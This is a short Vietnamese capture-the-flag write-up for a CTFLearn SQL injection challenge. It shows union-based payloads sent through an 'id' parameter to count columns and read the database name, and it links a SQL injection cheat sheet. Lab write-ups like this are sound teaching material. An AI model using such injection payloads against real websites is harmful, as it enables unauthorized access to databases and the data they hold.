Đây là một thử thách về Union Based SQLI ở CTFLearn, truy cập vào https://web.ctflearn.com/web8 thì mình thấy có parameters "id" được truyền qua phương thức GET. Đây có thể là nơi để exploit.

## Xác định số cột trong database

Khi mình truyền tham số 1 vào parameters id thì có 3 phần đó là

```
Name: Saranac
Breed: Great Dane
Color: Black
```

Sử dụng một truy vấn UNION cơ bản

```
1 union select 1,2,3,4-- 
```
Ta xác định dược rằng có 4 columns ở đây
## Tìm tên database và tables name bằng GROUP_CONCAT function
Có thể tham khảo cheatsheet ở https://gist.github.com/nani1337/02c65b06d0dbcf3b9a684f5caf78ad15#file-0x01-basic-sqlinjection-cheat-sheet-L86

```
-1 UNION SELECT 1,2,database(),4 from information_schema.tables--
```
Ở đây ta có thể thấy database tên là **webeight**
![](https://raw.githubusercontent.com/K3v1ne/ctf-wu/main/Inj3ction-Time/Capture.PNG)
